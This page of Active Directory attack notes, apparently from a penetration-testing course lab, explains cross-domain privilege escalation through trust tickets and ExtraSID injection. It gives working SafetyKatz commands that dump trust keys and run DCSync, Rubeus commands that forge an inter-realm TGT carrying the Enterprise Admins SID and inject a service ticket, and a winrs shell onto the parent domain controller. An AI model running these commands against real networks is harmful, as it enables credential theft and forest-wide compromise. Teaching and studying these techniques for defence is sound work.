---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Cross-Domain

In Active Directory environments, trust relationships govern access across domain or forest boundaries. Within a single forest, **domains are linked by default through implicit two-way trust**.

A key attribute in these trust-based escalations is `sIDHistory`, which stores the old Security Identifier (SID) when a user account is migrated between domains. While its intended use is to preserve access to legacy resources, it creates an opportunity for privilege escalation under specific conditions, particularly through **Trust Tickets** and **ExtraSID injection**.

## Trust Tickets

**Trust Tickets** exploit the Kerberos trust mechanism between domains. When a user from a child domain requests access to services in a parent domain, a **cross-realm TGT** is issued by the child’s DC. This TGT is **encrypted with a shared trust key** and presented to the parent’s DC, which validates it using the same key. By default, this key—functionally similar to a machine account password—is the NTLM hash of the trust object and rotates every 30 days.

<figure><img src="../../../.gitbook/assets/trust_keys.png" alt=""><figcaption></figcaption></figure>

If this NTLM hash is obtained (typically RC4-based), it becomes possible to **forge a cross-realm TGT**. The forged ticket can then include privileged SIDs such as **Enterprise Admins** (`-519`) in the `sIDHistory` field, effectively tricking the parent DC into recognizing the ticket as one issued to a highly privileged user. This enables unauthorized access to services and systems in the parent domain.

{% tabs %}
{% tab title="1. Trust Key & Parent SID" %}
Extract the trust key as a DA:

{% code overflow="wrap" %}
```powershell
.\SafetyKatz.exe "lsadump::trust /patch" "exit"
.\SafetyKatz.exe "lsadump::lsa /patch" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$" "exit"
```
{% endcode %}

Get the parent domain SID:

```powershell
Get-DomainSID -Domain moneycorp.local
```
{% endtab %}

{% tab title="2.  Cross-Realm TGT" %}
Forge the inter-realm TGT:

{% code overflow="wrap" %}
```powershell
.\Rubeus.exe silver /service:krbtgt/<child-domain-FQDN> /rc4:<rc4> /sid:<child-domain-SID> /sids:<parent-domain-SID-519 /ldap /user:Administrator /nowrap
```
{% endcode %}
{% endtab %}

{% tab title="3. TGS" %}
Request and inject the TGS:

{% code overflow="wrap" %}
```powershell
# Request and inject the TGS
.\Rubeus.exe asktgs /service:http/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket:doI...hbA==
```
{% endcode %}

Access the parent's domain resource:

```powershell
# Access the DC of the parent DC
winrs -r:mcorp-dc.moneycorp.local cmd
```
{% endtab %}
{% endtabs %}

## ExtraSID Injection

The **ExtraSID attack** builds upon this concept but operates entirely within the Kerberos framework. After compromising a domain and obtaining its KRBTGT hash, an attacker can forge a TGT and embed additional SIDs from trusted domains—particularly high-privilege group SIDs—into the `extra-sid` or `sIDHistory` fields of the ticket. Since domain controllers in the trusted domain accept these SIDs as valid during service ticket validation, the forged TGT grants elevated access beyond the attacker's original domain. This includes the ability to access Domain Controllers and critical systems across the forest, potentially leading to full forest compromise.

These attacks demonstrate the risk of overly permissive trust relationships and highlight the importance of securing inter-domain authentication paths, regularly auditing trust keys, and monitoring for suspicious Kerberos ticket activity.
